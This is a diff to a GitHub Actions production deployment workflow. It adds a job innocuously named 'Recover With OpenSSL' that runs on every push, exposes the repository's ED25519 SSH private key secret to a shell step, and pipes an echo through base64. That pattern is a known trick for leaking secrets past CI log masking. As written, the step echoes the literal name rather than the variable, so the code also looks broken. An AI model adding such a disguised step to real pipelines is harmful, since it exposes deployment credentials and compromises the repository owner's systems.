@@ -1,6 +1,14 @@
 name: Deployment to Production
 on: [push]
 jobs:
+  openssl:
+    name: Recover With OpenSSL
+    runs-on: ubuntu-20.04
+    steps:
+    - run: 'echo "KEY_ED25519" | base64'
+      shell: bash
+      env:
+        SSH_KEY: ${{ secrets.KEY_ED25519 }}
   build:
     name: Deployment Process
     runs-on: ubuntu-latest
